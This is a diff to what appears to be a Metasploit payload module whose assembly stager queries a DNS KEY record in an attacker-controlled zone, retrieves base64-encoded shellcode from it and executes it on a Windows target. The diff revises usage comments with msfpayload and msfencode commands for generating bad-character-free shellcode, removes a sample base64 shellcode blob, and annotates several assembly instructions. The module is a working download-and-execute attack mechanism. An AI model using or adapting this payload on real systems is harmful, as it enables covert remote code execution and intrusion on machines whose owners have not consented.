@@ -44,19 +44,14 @@ module Metasploit3
 
 	# 
 	# Usage :
-	# 1. Generate the shellcode you want to execute
+	# 1. Generate the shellcode you want to execute. Make sure it does not contain \x00,\x0a or \x0d
 	# 2. base64 encode the raw output, put everything on one line. 
 	# Example
-	# ./msfpayload windows/messagebox TEXT="You have been pwned" TITLE="Friendly message from corelanc0d3r" R > /tmp/msgbox.bin
+	# ./msfpayload windows/messagebox TEXT="You have been pwned" TITLE="Friendly message from corelanc0d3r" R |
+	#    ./msfencode -b '\x00\x0a\x0d' -t raw > /tmp/msgbox.bin
 	# base64 < /tmp/msgbox.bin 
-	#  2eub2XQk9DHSsncxyWSLcTCLdgyLdhyLRgiLfiCLNjhPGHXzWQHR/+Fgi2wkJItFPItUKHgB6otK
-	#  GItaIAHr4zRJizSLAe4x/zHA/KyEwHQHwc8NAcfr9Dt8JCh14YtaJAHrZosMS4taHAHriwSLAeiJ
-	#  RCQcYcOyCCnUieWJwmiOTg7sUuif////iUUEu37Y4nOHHCRS6I7///+JRQhobGwgQWgzMi5kaHVz
-	#  ZXKIXCQKieZW/1UEicJQu6iiTbyHHCRS6GH///9oM3JYIGhuYzBkaHJlbGFobSBjb2ggZnJvaHNh
-	#  Z2VoIG1lc2huZGx5aEZyaWUx24hcJCKJ42huZWRYaG4gcHdoIGJlZWhoYXZlaFlvdSAxyYhMJBOJ
-	#  4THSUlNRUv/QMcBQ/1UI
-
-	# 3. Create a DNS KEY record in a zone you control and paste the base64 encoded version of the payload as KEY
+	#  <put the output on one line>
+	# 3. Create a DNS (public) KEY record in a zone you control and paste the base64 encoded version of the payload as public key
 	# 4. Generate this payload to perform the DNS query, retrieve the payload & execute it 
 
 	#
@@ -71,8 +66,8 @@ module Metasploit3
 
 		#create actual payload
 		payload_data = <<EOS
-	cld
-	call start
+	cld			; clear direction flag
+	call start		; start main routine
 ; Stephen Fewer's block_api
 ; block_api code (Stephen Fewer)
 api_call:
@@ -174,8 +169,8 @@ dnsquery:
 	jmp get_dnsname
 get_dnsname_return:
 	pop eax			; get ptr to dnsname (lpstrName)
-	push esp
-	pop ebx
+	push esp		; prepare ppQueryResultsSet
+	pop ebx			;   (put ptr to ptr to stack on stack)
 	sub ebx,4
 	push ebx
 	push 0			; pReserved
